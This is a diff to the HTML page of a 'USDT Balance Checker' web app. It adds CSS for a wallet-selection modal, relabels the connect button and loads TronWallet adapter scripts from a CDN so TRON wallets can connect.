@@ -5,13 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>USDT Balance Checker</title>
     <link rel="stylesheet" href="style.css">
+    <!-- TronWallet Adapter CSS (for modal) -->
+    <link rel="stylesheet" href="https://unpkg.com/@tronweb3/tronwallet-adapter-react-ui/dist/style.css" />
+    <style>
+        /* Additional custom styles for the modal */
+        .wallet-modal-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .wallet-modal {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            max-width: 300px;
+            width: 90%;
+            text-align: center;
+        }
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .wallet-option:hover {
+            background: #f0f0f0;
+        }
+        .wallet-option img {
+            width: 30px;
+            height: 30px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <h1>💰 USDT Balance Checker</h1>
         <p class="sub">Connect your TRON wallet to check balance and claim rewards</p>
 
-        <button id="connectBtn" class="btn-primary">🔌 Connect TronLink</button>
+        <button id="connectBtn" class="btn-primary">🔌 Connect Wallet</button>
 
         <div id="walletInfo" class="hidden">
             <p><strong>Address:</strong> <span id="walletAddress"></span></p>
@@ -23,7 +69,11 @@
         <div id="status" class="status"></div>
     </div>
 
+    <!-- TronWeb + Adapter libraries -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.0.0/dist/TronWeb.js"></script>
+    <script src="https://unpkg.com/@tronweb3/tronwallet-adapters@0.1.0/dist/index.umd.js"></script>
+    <script src="https://unpkg.com/@tronweb3/tronwallet-adapter-react-ui@0.1.0/dist/index.umd.js"></script>
+    
     <script src="app.js"></script>
 </body>
 </html>
